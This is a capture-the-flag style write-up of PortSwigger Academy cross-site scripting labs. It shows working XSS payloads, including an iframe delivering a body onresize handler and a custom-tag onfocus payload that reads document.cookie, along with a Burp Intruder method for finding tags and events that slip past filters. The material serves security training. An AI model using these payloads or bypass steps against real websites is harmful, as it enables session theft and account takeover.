# 🪞 Reflected XSS

When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.

<figure><img src="../../.gitbook/assets/image (868).png" alt=""><figcaption></figcaption></figure>

Some useful ways of executing JavaScript are:

`<script>alert(document.domain)</script> <img src=1 onerror=alert(1)>`

### Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with nothing encoded

This one was pretty straightforward:

```
<script>alert(1)</script>
```

<figure><img src="../../.gitbook/assets/image (866).png" alt=""><figcaption></figcaption></figure>

### Lab: [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) into HTML context with nothing encoded

This one was still easy but interesting to see the process:

We find a message input and decide to inject the same payload:

```
<script>alert(1)</script>
```

Once we send the message, we can refresh the page and see our XSS:

<figure><img src="../../.gitbook/assets/image (867).png" alt=""><figcaption></figcaption></figure>

### Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with most tags and attributes blocked

We have a webpage and a exploit server:

we try injecting this:

```
<img src=1 onerror=print()>
```

<figure><img src="../../.gitbook/assets/image (869).png" alt=""><figcaption></figcaption></figure>

but we get a "tag not allowed" message

Now a very interesting technique, we capture the req, remove the payload and put <> in it, select in between and add 2 payloads like this:

<figure><img src="../../.gitbook/assets/image (870).png" alt=""><figcaption></figcaption></figure>

We go on the cheat sheet and copy the tags:

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}

<figure><img src="../../.gitbook/assets/image (871).png" alt=""><figcaption></figcaption></figure>

after launching the attack with the intruder, we quickly see that the "body" is the good tag:

&#x20;

<figure><img src="../../.gitbook/assets/image (872).png" alt=""><figcaption></figcaption></figure>

So we go on the positions tab and add the following tag and create a new intruder payload position just before the =:

<figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>

Then go back to the cheat sheet, copy all events and start again with the attack:

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}

There are a few events that triggered a 200 response:

<figure><img src="../../.gitbook/assets/image (874).png" alt=""><figcaption></figcaption></figure>

```
<iframe src="https://0a71007c048e9ed581f89ddd006100c9.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

* `<iframe src="https://0a71007c048e9ed581f89ddd006100c9.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"`: This part creates an `<iframe>` element with its `src` attribute pointing to a website. The website URL includes a parameter `search` with encoded characters, specifically `%22%3E%3Cbody%20onresize=print()%3E`, which when decoded translates to `"><body onresize=print()>`. This part of the payload is attempting to inject malicious code into the website.
* `onload=this.style.width='100px'`: This part is JavaScript code. It sets the width of the iframe to 100 pixels when the iframe is loaded. This could be an attempt to hide the injected content or make it less noticeable.
* The injected JavaScript code `<body onresize=print()>` attaches an event handler to the `<body>` element of the target webpage. This event handler is triggered when the user resizes the browser window. When triggered, it executes the `print()` function, which typically prints the current webpage. This can be used by an attacker to perform actions on behalf of the user, such as stealing sensitive information or performing malicious actions.

We then go to the exploit server, store and exploit this payload in the body and complete the lab just like this:

<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>

### Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with all tags blocked except custom ones

we first see that we've got the same "tag not allowed" error

So we go on the same methodology as earlier:

We copy and paste all of the tags and use intruder to find the perfect one:

<figure><img src="../../.gitbook/assets/image (877).png" alt=""><figcaption></figcaption></figure>

So i first hop on hacktricks:

{% embed url="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#custom-tags" %}

We find this payload that will be a big part of the payload:

```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```

and are able to craft the following payload:

```
<script>
location = 'https://0a9d003a03a2136280edfd800017004c.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

* `<script>`: This tag is used to define a client-side script, typically JavaScript.
* `location = 'https://0a9d003a03a2136280edfd800017004c.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';`: This line sets the `location` property of the current window to a URL. The URL in this case points to a specific website (`https://0a9d003a03a2136280edfd800017004c.web-security-academy.net/`) and includes a query parameter `search`.
* `search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E`: This parameter is URL-encoded. When decoded, it translates to `<xss id=x onfocus=alert(document.cookie) tabindex=1>`. This part of the URL payload is attempting to inject a malicious script into the target webpage.
* The injected script `<xss id=x onfocus=alert(document.cookie) tabindex=1>` sets up an XSS payload. Specifically, it attaches an `onfocus` event handler to an element with the id `x`. When this element receives focus (e.g., through user interaction), the `alert(document.cookie)` function is executed. This function displays the cookies associated with the current webpage, which can contain sensitive information like session tokens or user credentials.
